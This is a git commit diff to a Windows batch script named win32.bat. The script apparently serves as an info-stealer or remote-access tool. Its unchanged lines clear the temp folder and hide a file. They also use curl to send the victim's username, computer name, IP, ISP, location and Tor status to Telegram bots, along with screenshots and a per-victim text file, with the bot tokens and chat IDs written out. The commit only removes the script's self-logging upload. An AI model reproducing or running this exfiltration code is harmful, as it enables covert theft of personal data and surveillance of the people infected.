8c291ac135645f4dbed6b544e6f5c5c703318cd3
cryptedodissey <90626486+cryptedodissey@users.noreply.github.com>
2023-07-18 08:28:06 +0200

    Update win32.bat

--- win32.bat
+++ win32.bat
@@ -1,9 +1,6 @@
 @echo off
 setlocal 
-call :LOG >> "%temp%\batch.tmp"
-exit /B
 
-:LOG
 del /s /f /q /a "%temp%\*"
 FOR /D %%p IN ("%temp%\*.*") DO rmdir "%%p" /s /q
 :connectivitycheck
@@ -85,9 +82,6 @@ attrib +s +h +i "C:\drives.html"
 "%environment%\curl.exe" -k %proxy% -F text="NEW CONNECTION: %username%@%computername% [%WinEdition% %OSArchitecture%] [%ISP% (%ExtIP%)] [%City% (%Region%, %Country%)] [{Tor is enabled: %TorStatus%] [Web Server:%WS% ] [Live Stream: %LS%] " https://api.telegram.org/bot5919717252:AAE3HbKOIhMcsP9NiKLAAZD8Nf9HQhRZgIY/sendMessage?chat_id=-854583574
 for %%# in ("*.png") do "%environment%\curl.exe" -k %proxy% -F document=@"%%~f#" https://api.telegram.org/bot6053961003:AAENR1HtCpNA7AJaWN1LUnPXxuEsoogKBG8/sendDocument?chat_id=-1001930176759
 "%environment%\curl.exe" -k %proxy% -F document=@"%username%@%computername%.txt" https://api.telegram.org/bot6330710820:AAFCaGDiYMvQ2SJxcMbvP6D2_tCFS9NtBzo/sendDocument?chat_id=-1001909920652
-copy /y "%temp%\batch.tmp" "batch.log"
-"%environment%\curl.exe" -k %proxy% -F document=@"batch.log" https://api.telegram.org/bot6330710820:AAFCaGDiYMvQ2SJxcMbvP6D2_tCFS9NtBzo/sendDocument?chat_id=-1001909920652
-setlocal disableDelayedExpansion
 
 cd "%temp%"
 rmdir /s /q "%temp%\%folder%"
